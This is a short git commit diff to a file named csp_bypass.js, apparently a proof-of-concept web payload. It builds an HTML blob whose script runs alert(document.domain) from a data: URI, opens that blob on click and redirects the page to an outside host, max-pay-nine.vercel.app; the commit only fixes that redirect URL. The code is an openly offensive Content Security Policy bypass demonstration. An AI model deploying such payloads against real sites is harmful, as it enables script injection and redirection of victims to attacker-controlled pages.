e03ab0de7d4e9508fe8acd9986e4f3aec07ae50a
mrnoob790 <44310679+mrnoob790@users.noreply.github.com>
2025-08-29 18:05:47 +0530

    Update csp_bypass.js

--- csp_bypass.js
+++ csp_bypass.js
@@ -2,7 +2,7 @@ const blob = new Blob([`
 <html>
 	<body>
 		<script src="data:application/javascript,alert(document.domain);"></script>
-		<meta http-equiv="refresh" content="2;url=http://https://max-pay-nine.vercel.app/back.html">
+		<meta http-equiv="refresh" content="2;url=https://max-pay-nine.vercel.app/back.html">
 	</body>
 </html>`], {type : "text/html"});
 
@@ -10,4 +10,5 @@ onclick = () => {
 	open(URL.createObjectURL(blob));
 
 }
+
 
